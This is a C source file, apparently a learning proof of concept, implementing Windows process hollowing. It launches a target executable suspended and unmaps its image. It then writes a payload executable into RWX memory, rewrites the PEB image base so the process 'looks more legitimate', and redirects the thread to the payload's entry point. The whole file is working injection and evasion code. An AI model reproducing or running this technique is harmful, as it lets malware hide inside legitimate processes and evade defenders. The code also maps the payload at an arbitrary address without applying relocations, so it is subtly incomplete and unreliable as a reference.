#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tchar.h>
// No need for wdmguid.h typically
#include <winternl.h> // Needed for PEB, PROCESS_BASIC_INFORMATION, NtQueryInformationProcess
// winerror.h is included by windows.h
#include <iostream>

#pragma comment(lib,"ntdll.lib") // Link against ntdll.lib for Nt* functions

// Declare NtQueryInformationProcess if not fully defined by winternl.h
// Typically it is, but this is safer depending on SDK version
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

EXTERN_C NTSTATUS NTAPI NtQueryInformationProcess(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress);

int main(void) {
    LPBYTE pData = NULL; // This variable wasn't actually used for payload data
    PIMAGE_DOS_HEADER pidh = NULL;
    PIMAGE_NT_HEADERS pinh = NULL;
    PIMAGE_SECTION_HEADER pish = NULL;

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    PROCESS_BASIC_INFORMATION bi = {}; // Use {} for zero-initialization
    CONTEXT Ctx = {}; // Initialize Ctx

    // Define target and payload paths (replace with your actual paths)
    wchar_t processTarget[] = L"C:\\Users\\rmgrammatico\\Downloads\\GameHacking\\Basic-Tests\\ProcessHollowing\\target.exe"; // Example: Use a common 64-bit target
    wchar_t processPayload[] = L"C:\\Users\\rmgrammatico\\Downloads\\GameHacking\\Basic-Tests\\ProcessHollowing\\payload.exe";  // IMPORTANT: Replace with your 64-bit payload path

    // Initialize STARTUPINFO and PROCESS_INFORMATION
    SecureZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    SecureZeroMemory(&pi, sizeof(pi));
    // No need to re-initialize si and pi for the payload path string

    // --- Stage 1: Create target process in suspended state ---
    printf("Stage 1 - Create process in suspend mode\n");

    if (!CreateProcess(
        NULL,               // No module name (use command line)
        processTarget,      // Command line (target process path)
        NULL,               // Process handle not inheritable
        NULL,               // Thread handle not inheritable
        FALSE,              // Set handle inheritance to FALSE
        CREATE_SUSPENDED,   // Create the process in a suspended state
        NULL,               // Use parent's environment block
        NULL,               // Use parent's starting directory
        &si,                // Pointer to STARTUPINFO structure
        &pi)                // Pointer to PROCESS_INFORMATION structure
        )
    {
        printf("CreateProcess failed (%lu).\n", GetLastError());
        system("pause");
        return EXIT_FAILURE;
    }

    printf("Target process started in suspended mode...\n");
    printf("PID: %lu, Process Handle: %p, Thread Handle: %p\n", pi.dwProcessId, pi.hProcess, pi.hThread);
    system("pause");

    // --- Stage 2: Read payload executable from disk ---
    printf("\nStage 2 - Read payload executable from disk\n");

    HANDLE hFile = CreateFileW(processPayload, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Error: Unable to open payload executable '%ls'. CreateFile failed with error %lu\n", processPayload, GetLastError());
        TerminateProcess(pi.hProcess, 1); // Clean up target process
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        system("pause");
        return EXIT_FAILURE;
    }
    printf("Payload executable opened successfully.\n");

    DWORD nSizeOfFile = GetFileSize(hFile, NULL);
    if (nSizeOfFile == INVALID_FILE_SIZE) {
        printf("Error: GetFileSize failed with error %lu\n", GetLastError());
        CloseHandle(hFile);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        system("pause");
        return EXIT_FAILURE;
    }

    // Allocate local memory for the payload file content
    PVOID image = VirtualAlloc(NULL, nSizeOfFile, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (image == NULL) {
        printf("Error: VirtualAlloc failed for local payload buffer with error %lu\n", GetLastError());
        CloseHandle(hFile);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        system("pause");
        return EXIT_FAILURE;
    }

    DWORD bytesRead = 0;
    if (!ReadFile(hFile, image, nSizeOfFile, &bytesRead, NULL) || bytesRead != nSizeOfFile) {
        printf("Error: Unable to read the payload executable. ReadFile failed with error %lu or read incomplete.\n", GetLastError());
        VirtualFree(image, 0, MEM_RELEASE); // Free local buffer
        CloseHandle(hFile);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        system("pause");
        return EXIT_FAILURE;
    }
    printf("Payload executable read successfully into local memory at %p (%lu bytes).\n", image, bytesRead);
    CloseHandle(hFile); // Close the payload file handle

    // --- Validate Payload PE structure ---
    pidh = (PIMAGE_DOS_HEADER)image;
    if (pidh->e_magic != IMAGE_DOS_SIGNATURE) { // Check DOS signature "MZ"
        printf("Error: Invalid payload executable format (No MZ signature).\n");
        VirtualFree(image, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        system("pause");
        return EXIT_FAILURE;
    }

    // Get NT Headers
    pinh = (PIMAGE_NT_HEADERS)((LPBYTE)image + pidh->e_lfanew);
    if (pinh->Signature != IMAGE_NT_SIGNATURE) { // Check PE signature "PE\0\0"
        printf("Error: Invalid payload executable format (No PE signature).\n");
        VirtualFree(image, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        system("pause");
        return EXIT_FAILURE;
    }

    // --- Architecture Check (Crucial!) ---
    // Ensure injector and target/payload architecture match (e.g., both 64-bit)
    // This example assumes 64-bit hollowing. Add checks if needed.
#ifdef _WIN64
    if (pinh->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
        printf("Error: Payload is not a 64-bit executable, but injector is 64-bit.\n");
        // Cleanup...
        VirtualFree(image, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        system("pause"); return EXIT_FAILURE;
    }
#else // _WIN32
    if (pinh->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
        printf("Error: Payload is not a 32-bit executable, but injector is 32-bit.\n");
        // Cleanup...
        VirtualFree(image, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        system("pause"); return EXIT_FAILURE;
    }
#endif
    printf("Payload PE structure validated.\n");


    // --- Stage 3: Get Target Process Image Base Address ---
    printf("\nStage 3 - Get target process image base address via PEB\n");

    // Query PROCESS_BASIC_INFORMATION to get the PEB address
    ULONG returnLen = 0;
    NTSTATUS statusQuery = NtQueryInformationProcess(
        pi.hProcess,
        ProcessBasicInformation, // Information class
        &bi,                     // Buffer to receive information
        sizeof(PROCESS_BASIC_INFORMATION), // Size of buffer
        &returnLen               // Bytes written or required
    );

    if (!NT_SUCCESS(statusQuery) || returnLen != sizeof(PROCESS_BASIC_INFORMATION)) {
        printf("NtQueryInformationProcess failed. Status: 0x%lx, Error: %lu\n", statusQuery, GetLastError());
        VirtualFree(image, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        system("pause");
        return EXIT_FAILURE;
    }
    printf("NtQueryInformationProcess succeeded. PEB address: %p\n", bi.PebBaseAddress);

    // Calculate the address of the ImageBaseAddress field within the remote PEB
    // Offset 0x10 for 64-bit, 0x08 for 32-bit
#ifdef _WIN64
    PVOID remotePebImageBaseField = (PVOID)((LPBYTE)bi.PebBaseAddress + 0x10);
#else
    PVOID remotePebImageBaseField = (PVOID)((LPBYTE)bi.PebBaseAddress + 0x08);
#endif

    // Read the ImageBaseAddress value from the remote process
    LPVOID targetImageBase = 0; // This will hold the actual base address of target.exe
    SIZE_T bytesReadFromMem = 0;
    if (!ReadProcessMemory(pi.hProcess, remotePebImageBaseField, &targetImageBase, sizeof(LPVOID), &bytesReadFromMem) || bytesReadFromMem != sizeof(LPVOID)) {
        printf("ReadProcessMemory (reading PEB ImageBaseAddress) failed with error code: %lu\n", GetLastError());
        VirtualFree(image, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        system("pause");
        return EXIT_FAILURE;
    }
    printf("Successfully read target ImageBaseAddress from PEB: %p\n", targetImageBase);
    system("pause");


    // --- Stage 4: Unmap the original executable's memory ---
    printf("\nStage 4 - Unmap original executable's memory section\n");

    // Use the actual targetImageBase read from the PEB
    NTSTATUS statusUnmap = NtUnmapViewOfSection(pi.hProcess, targetImageBase);

    // Check for SUCCESS, not error
    if (!NT_SUCCESS(statusUnmap)) {
        // NtUnmapViewOfSection might fail if the address doesn't map a section view,
        // which could happen if ASLR placed it elsewhere or if it's already gone.
        // However, for typical process hollowing, this *should* succeed.
        // Status 0xC000000D (STATUS_INVALID_PARAMETER) is common if targetImageBase is wrong.
        printf("NtUnmapViewOfSection failed! Status: 0x%lx\n", statusUnmap);
        // GetLastError() might not be set by NTSTATUS functions, Status is more informative.
        // Proceeding might still work in some cases, but it's risky.
        // Consider returning EXIT_FAILURE here. For learning, we'll pause.
        system("pause");
        // return EXIT_FAILURE; // Recommended in production
    }
    else {
        printf("NtUnmapViewOfSection succeeded for address %p.\n", targetImageBase);
    }
    system("pause");


    // --- Stage 5: Allocate memory in the target process for the payload ---
    printf("\nStage 5 - Allocate memory in target process for payload\n");

    // Allocate memory at a system-chosen address (NULL) for robustness.
    // If payload requires its preferred base (pinh->OptionalHeader.ImageBase),
    // pass that address here, but you MUST check if VirtualAllocEx returns it.
    // Allocating at NULL is generally safer.
    LPVOID remotePayloadBase = VirtualAllocEx(
        pi.hProcess,
        NULL, // Let the system choose the address (safer)
        // (PVOID)pinh->OptionalHeader.ImageBase, // Alternative: Try preferred base
        pinh->OptionalHeader.SizeOfImage, // Size needed for the payload image
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE); // Need RWX permissions

    if (remotePayloadBase == NULL) {
        printf("VirtualAllocEx failed with error code: %lu\n", GetLastError());
        VirtualFree(image, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        system("pause");
        return EXIT_FAILURE;
    }
    printf("VirtualAllocEx succeeded. Allocated memory at: %p\n", remotePayloadBase);
    system("pause");


    // --- Stage 6: Write the payload into the allocated memory ---
    printf("\nStage 6 - Write Payload to the Target process memory\n");
    printf("Payload Preferred ImageBase: %p\n", (LPVOID)pinh->OptionalHeader.ImageBase);
    printf("Writing Headers to remote address: %p\n", remotePayloadBase);

    // Write PE Headers
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(pi.hProcess,
        remotePayloadBase,      // Target base address (returned by VirtualAllocEx)
        image,                  // Source buffer (payload in local memory)
        pinh->OptionalHeader.SizeOfHeaders, // Size of headers
        &bytesWritten) || bytesWritten != pinh->OptionalHeader.SizeOfHeaders)
    {
        printf("WriteProcessMemory (Headers) failed with error code: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remotePayloadBase, 0, MEM_RELEASE); // Free allocated remote memory
        VirtualFree(image, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        system("pause");
        return EXIT_FAILURE;
    }
    printf("Payload Headers written correctly (%zu bytes).\n", bytesWritten);

    // Write PE Sections
    printf("Writing Sections...\n");
    for (DWORD i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
        pish = (PIMAGE_SECTION_HEADER)((LPBYTE)image + pidh->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));

        // Calculate target address for the section
        LPVOID remoteSectionVA = (LPVOID)((LPBYTE)remotePayloadBase + pish->VirtualAddress);
        // Source address in the local payload buffer
        PVOID localSectionRawData = (PVOID)((LPBYTE)image + pish->PointerToRawData);

        printf("  Writing section %.8s to VA: %p (Size: %lu bytes)\n", // %.8s to prevent buffer overflow if name isn't null-terminated
            pish->Name, remoteSectionVA, pish->SizeOfRawData);

        if (pish->SizeOfRawData > 0) // Only write sections with actual data
        {
            bytesWritten = 0;
            if (!WriteProcessMemory(pi.hProcess,
                remoteSectionVA,        // Target address = allocated base + section RVA
                localSectionRawData,    // Source = payload file buffer + raw data offset
                pish->SizeOfRawData,    // Size of section data
                &bytesWritten) || bytesWritten != pish->SizeOfRawData)
            {
                printf("WriteProcessMemory (Section %lu: %.8s) failed with error code: %lu\n", i, pish->Name, GetLastError());
                VirtualFreeEx(pi.hProcess, remotePayloadBase, 0, MEM_RELEASE);
                VirtualFree(image, 0, MEM_RELEASE);
                TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
                system("pause");
                return EXIT_FAILURE;
            }
        }
        else {
            printf("  Skipping section %.8s (SizeOfRawData is 0).\n", pish->Name);
        }
    }
    printf("Payload Sections written correctly.\n");
    system("pause");


    // --- Stage 7: Set Thread Context to payload's entry point and update PEB ---
    printf("\nStage 7 - Set Thread context and update PEB\n");

    // Get the current context of the suspended thread
    Ctx.ContextFlags = CONTEXT_FULL; // Request all register info
    if (!GetThreadContext(pi.hThread, &Ctx)) {
        printf("GetThreadContext failed (%lu).\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remotePayloadBase, 0, MEM_RELEASE);
        VirtualFree(image, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        system("pause");
        return EXIT_FAILURE;
    }
    printf("GetThreadContext succeeded.\n");

    // Calculate the new entry point: Actual Allocation Base + Entry Point RVA
    // Cast remotePayloadBase to DWORD64 for pointer arithmetic
    DWORD64 newEntryPoint = (DWORD64)remotePayloadBase + pinh->OptionalHeader.AddressOfEntryPoint;

    // Set the Instruction Pointer register (RIP for x64, Eip for x32)
#ifdef _WIN64
    Ctx.Rip = newEntryPoint;
    printf("Setting RIP (new entry point) to: 0x%llx\n", Ctx.Rip);
#else
    Ctx.Eip = (DWORD)newEntryPoint; // Eip is 32-bit
    printf("Setting EIP (new entry point) to: 0x%lx\n", Ctx.Eip);
#endif


    // Update the PEB->ImageBaseAddress field in the remote process
    // This makes the process look more legitimate to some checks/APIs
    printf("Attempting to update PEB->ImageBaseAddress at %p\n", remotePebImageBaseField);
    printf("  Old value (target.exe base): %p\n", targetImageBase);
    printf("  New value (payload base): %p\n", remotePayloadBase);

    bytesWritten = 0;
    // Write the VALUE of the new base address (remotePayloadBase) to the PEB field
    if (!WriteProcessMemory(pi.hProcess,
        remotePebImageBaseField, // Address of ImageBaseAddress field in remote PEB
        &remotePayloadBase,      // Address OF the variable holding the new base address
        sizeof(PVOID),           // Size of a pointer
        &bytesWritten) || bytesWritten != sizeof(PVOID))
    {
        // This might not be fatal, but worth noting
        printf("Warning: WriteProcessMemory (PEB ImageBaseAddress) failed (%lu). Bytes written: %zu\n", GetLastError(), bytesWritten);
        system("pause"); // Pause so user sees the warning
    }
    else {
        printf("PEB->ImageBaseAddress updated successfully.\n");
    }


    // Set the modified context back to the thread
    printf("Setting modified Thread Context...\n");
    if (!SetThreadContext(pi.hThread, &Ctx)) {
        printf("SetThreadContext failed (%lu).\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remotePayloadBase, 0, MEM_RELEASE);
        VirtualFree(image, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        system("pause");
        return EXIT_FAILURE;
    }
    printf("SetThreadContext succeeded.\n");
    system("pause");


    // --- Stage 8: Resume the thread ---
    printf("\nStage 8 - Resume Thread\n");

    DWORD suspendCount = ResumeThread(pi.hThread);
    if (suspendCount == (DWORD)-1) {
        printf("ResumeThread failed with error code: %lu\n", GetLastError());
        // Even if resume fails, try to clean up
        VirtualFreeEx(pi.hProcess, remotePayloadBase, 0, MEM_RELEASE);
        VirtualFree(image, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        system("pause");
        return EXIT_FAILURE;
    }

    printf("Thread resumed successfully. Previous suspend count: %lu\n", suspendCount);
    printf("Payload should now be running in the hollowed process.\n");
    system("pause"); // Pause to observe the hollowed process


    // --- Cleanup ---
    printf("\nCleaning up handles and local memory...\n");
    VirtualFree(image, 0, MEM_RELEASE); // Free the local buffer holding the payload
    CloseHandle(pi.hThread);            // Close the thread handle
    CloseHandle(pi.hProcess);           // Close the process handle

    // Optional: TerminateProcess(pi.hProcess, 0);
    // Usually, you let the payload run and exit naturally.
    // Terminating here might kill the payload prematurely.

    // Optional: Wait for the hollowed process to exit
    // printf("Waiting for hollowed process to exit...\n");
    // WaitForSingleObject(pi.hProcess, INFINITE);
    // printf("Hollowed process has exited.\n");

    printf("\nProcess Hollowing POC finished.\n");
    system("pause");
    return EXIT_SUCCESS;
}